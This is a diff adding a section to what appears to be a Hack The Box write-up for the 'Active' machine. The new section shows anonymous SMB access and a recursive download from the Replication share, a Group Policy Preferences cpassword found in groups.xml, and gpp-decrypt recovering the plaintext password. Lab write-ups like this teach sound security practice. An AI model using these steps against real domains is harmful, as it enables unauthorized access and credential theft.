@@ -225,3 +225,49 @@ Let's also try this recursively!
 ```
 
 Yay! We can anonymously read the *Replication* Share!
+
+### **Download All Files to Attacker Machine**
+
+```bash
+┌─[us-dedivip-1]─[10.10.14.63]─[lemagickonch@htb-qseth8qvyk]─[~]
+└──╼ [★]$ smbclient -U '%' -N \\\\10.129.38.174\\Replication
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sat Jul 21 05:37:44 2018
+  ..                                  D        0  Sat Jul 21 05:37:44 2018
+  active.htb                          D        0  Sat Jul 21 05:37:44 2018
+
+		5217023 blocks of size 4096. 278375 blocks available
+smb: \> mask ""
+smb: \> recurse ON
+smb: \> prompt OFF
+smb: \> mget *
+```
+
+After looking through the extracted files we find a username *SVC_TGS* and an encrypted password in the *groups.xml* file!
+
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="<REDACTED>" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
+</Groups>
+```
+
+Doing a simple Google search on *cpassword* we find that it is a known mal-practice of storing passwords in GPOs.
+
+Additionally, we can use this tools to crack the password
+[LINK](https://github.com/t0thkr1s/gpp-decrypt)
+
+### **Cracking the *cpassword* **
+
+```bash
+┌─[us-dedivip-1]─[10.10.14.63]─[lemagickonch@htb-qseth8qvyk]─[~/Desktop/gpp-decrypt]
+└──╼ [★]$ python gpp-decrypt.py -c edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+
+                               __                                __ 
+  ___ _   ___    ___  ____ ___/ / ___  ____  ____  __ __   ___  / /_
+ / _ `/  / _ \  / _ \/___// _  / / -_)/ __/ / __/ / // /  / _ \/ __/
+ \_, /  / .__/ / .__/     \_,_/  \__/ \__/ /_/    \_, /  / .__/\__/ 
+/___/  /_/    /_/                                /___/  /_/         
+
+[ * ] Password: GPPstillStandingStrong2k18
+```
